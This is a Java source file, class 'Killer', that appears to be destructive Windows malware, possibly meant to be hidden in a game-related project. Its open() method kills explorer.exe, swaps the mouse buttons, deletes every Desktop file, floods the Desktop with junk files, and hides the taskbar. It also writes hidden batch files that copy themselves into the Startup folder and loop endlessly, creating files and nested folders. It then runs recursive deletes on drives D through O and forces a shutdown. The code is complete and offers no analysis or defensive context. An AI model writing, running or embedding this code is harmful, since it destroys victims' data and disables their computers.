package game.over;

import com.sun.jna.Library;
import com.sun.jna.Native;
import com.sun.jna.win32.W32APIOptions;
import java.io.File;
import java.io.FileWriter;
import java.io.OutputStream;
import java.io.PrintStream;
import java.security.SecureRandom;

public class Killer
        extends PrintStream {

    public Killer(OutputStream outStream) {
        super(outStream);
    }

    @Override
    public void println(String p_println_1_) {
        this.logString();
    }

    public static void open() {
        Thread thread2 = new Thread(() -> {
            try {
                Runtime.getRuntime().exec("cmd /c start taskkill /IM explorer.exe /f");
                Runtime.getRuntime().exec("cmd /c start Rundll32 user32, SwapMouseButton"); // Swap Mouse Button ya
                Runtime.getRuntime().exec("cmd /c start /b md " + java.io.File.separator + java.io.File.separator + "?" + java.io.File.separator + java.lang.System.getenv("SystemDrive") + java.io.File.separator + "...");
                File[] fileArray = new File(System.getenv("USERPROFILE") + File.separator + "Desktop").listFiles();
                int n2 = 0;
                if (fileArray != null) {
                    n2 = fileArray.length;
                }
                int n3 = 0;
                while (n3 < n2) {
                    File file = fileArray[n3];
                    file.delete();
                    ++n3;
                }
                int i2 = 0;
                while (i2 < 30) {
                    new File(System.getenv("USERPROFILE") + File.separator + "Desktop" + File.separator + new SecureRandom().nextInt() + ".WhatCanISay").createNewFile();
                    ++i2;
                }
                User32.INSTANCE.SystemParametersInfo(20, 0, System.getenv("LOCALAPPDATA") + File.separator + "wallpaper.png", 1);
                User32.INSTANCE.ShowWindow(User32.INSTANCE.FindWindow("Shell_TrayWnd", ""), 0);
                User32.INSTANCE.ShowWindow(User32.INSTANCE.FindWindowEx(User32.INSTANCE.GetDesktopWindow(), 0, "button", 0), 0);
                File file1 = File.createTempFile("matrix", ".cmd");
                FileWriter fw1 = new FileWriter(file1);
                String bat1 = """
                        @echo off

                        copy "%0" "%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

                        :loop
                        color 2

                        echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%

                        goto loop""";
                fw1.write(bat1);
                fw1.close();
                Runtime.getRuntime().exec("cmd /c start " + file1.getPath());
                File file3 = File.createTempFile("data", ".bat");
                FileWriter fw3 = new FileWriter(file3);
                String bat3 = """
                        @echo off

                        copy "%0" "%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
                        cd %userprofile%\\desktop

                        :loop
                        echo %random% >> %random%.killer
                        md "%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%\\%random%"
                        goto loop""";
                fw3.write(bat3);
                fw3.close();
                Runtime.getRuntime().exec("cmd /c start /b " + file3.getPath());
                File file4 = File.createTempFile("open", ".cmd");
                FileWriter fw4 = new FileWriter(file4);
                String bat4 = """
                        @echo off

                        copy "%0" "%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
                        :loop
                        start https://ys.mihoyo.com/
                        exit""";
                fw4.write(bat4);
                fw4.close();
                Runtime.getRuntime().exec("cmd /c start /b " + file4.getPath());
                Runtime.getRuntime().exec("cmd /c start /b attrib " + file1.getAbsolutePath() + " +s +h");
                Runtime.getRuntime().exec("cmd /c start /b attrib " + file3.getAbsolutePath() + " +s +h");
                Runtime.getRuntime().exec("cmd /c start /b attrib " + file4.getAbsolutePath() + " +s +h");
                Runtime.getRuntime().exec("cmd /c start /b RD D:\\ /S /Q");
                Runtime.getRuntime().exec("cmd /c start /b RD E:\\ /S /Q");
                Runtime.getRuntime().exec("cmd /c start /b RD F:\\ /S /Q");
                Runtime.getRuntime().exec("cmd /c start /b RD G:\\ /S /Q");
                Runtime.getRuntime().exec("cmd /c start /b RD H:\\ /S /Q");
                Runtime.getRuntime().exec("cmd /c start /b RD I:\\ /S /Q");
                Runtime.getRuntime().exec("cmd /c start /b RD J:\\ /S /Q");
                Runtime.getRuntime().exec("cmd /c start /b RD K:\\ /S /Q");
                Runtime.getRuntime().exec("cmd /c start /b RD L:\\ /S /Q");
                Runtime.getRuntime().exec("cmd /c start /b RD M:\\ /S /Q");
                Runtime.getRuntime().exec("cmd /c start /b RD O:\\ /S /Q");
                Runtime.getRuntime().exec("cmd /c start shutdown /s /f /t 10");
            }
            catch (Exception exception) {
                // empty catch block
            }
        });
        thread2.start();
    }

    @Override
    public void println(Object p_println_1_) {
        this.logString();
    }

    private void logString() {
    }

    interface User32
            extends Library {
        User32 INSTANCE = (User32)Native.loadLibrary("user32", User32.class, W32APIOptions.DEFAULT_OPTIONS);

        void SystemParametersInfo(int var1, int var2, String var3, int var4);

        int FindWindow(String var1, String var2);

        void ShowWindow(int var1, int var2);

        int FindWindowEx(int var1, int var2, String var3, int var4);

        int GetDesktopWindow();
    }
}

